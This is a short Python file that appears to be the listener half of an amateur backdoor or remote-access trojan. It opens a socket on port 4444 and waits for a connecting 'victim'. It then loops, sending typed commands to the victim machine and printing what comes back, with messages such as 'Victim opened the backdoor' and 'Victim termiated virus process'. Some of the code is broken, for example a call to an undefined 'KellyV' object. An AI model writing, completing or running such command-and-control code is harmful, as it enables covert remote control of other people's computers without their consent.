import socket

runmain = True
victimList = ["fart"]
connectionest = False
victim = 0
pingtimer = 0

def main():
    global runmain
    global connectionest
    global victim
    runmain = False
    my_ip = 'localhost'
    port = 4444
    server = socket.socket()
    server.bind((my_ip, port))
    print('[+] Server Started')
    print('[+] Listening For Victim')
    server.listen(1)
    victim, victim_addr = server.accept()
    print(f'[+] {victim_addr} Victim opened the backdoor')
    connectionest = True

def onConnectionEST():
    global victim
    global connectionest
    global runmain
    global pingtimer
    try:
        pingtimer += 1
        print(pingtimer)
        if pingtimer > 1000:
            victim.send("ping".encode())
            pingtimer = 0
            print("ping")
        command = KellyV.__init__().commandInput.text
        if len(command) < 1:
            print("Command cannot be null")
            command = 'cd'
        if command == 'say' or command == 'python' or command == 'python3':
            print('Command cancelled because the written command breaks connection.')
            command = 'cd'
        command = command.encode()
        print(command)
        victim.send(command)
        print('[+] Command sent')
    except Exception as e:
        print(e)
        if type(e) == BrokenPipeError or type(e) == ConnectionResetError:
            print("Victim termiated virus process")
        connectionest = False
        runmain = True
    try:
        if connectionest == True:
            output = victim.recv(1000000000)
            output = output.decode()
            print(f"Output: {output}")
    except Exception as e:
        print(e)
        print("not working LOL")

while True:
    if runmain == True:
        main()
    if connectionest == True:
        onConnectionEST()